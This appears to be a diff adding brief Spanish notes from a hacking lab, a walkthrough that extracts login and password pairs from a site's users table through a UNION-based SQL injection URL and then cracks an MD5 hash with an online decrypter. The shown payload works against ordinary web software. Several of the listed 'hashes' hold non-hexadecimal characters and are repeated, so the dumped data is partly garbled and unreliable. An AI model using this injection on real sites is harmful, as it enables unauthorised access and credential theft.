@@ -1,0 +1,25 @@
+
+4dm1nw3b/hacklab
+
+comienza con una inyeccion de sql
+http://www.pcte.co/cat.php?id=-1+union+all+select+1,CONCAT(login,%27:%27,password),3,4+FROM+users--
+
+con esto obtenemos
+luego 
+primero teniamos
+4dm1nw3b:7052cad6b415f4272c1986aa9a50a7c3
+4dm1nw3b:7052cad6b415f4272c1986aa9a50a7c3
+admin:7052fyhol815f4272c1986aa5078a7c3
+admin:7052fyhol815f4272c1986aa5078a7c3
+4dm1n:ad4g7j9ljf15fdd4272c1986aa9a50a7c3
+4dm1n:ad4g7j9ljf15fdd4272c1986aa9a50a7c3
+@dmin:7052cad6b415f4dfdf272c1986aa9a7c3
+@dmin:7052cad6b415f4dfdf272c1986aa9a7c3
+adm1n:7052fyhol815gtas2c1986aa9a50a7c3
+
+
+Luego de resolver se debe hacer bruteforce sobre md5 o base64  o lo que sea
+haciendo uso de https://hashkiller.co.uk/md5-decrypter.aspx
+se obtiene 	
+7052cad6b415f4272c1986aa9a50a7c3 MD5 : hacklab
+
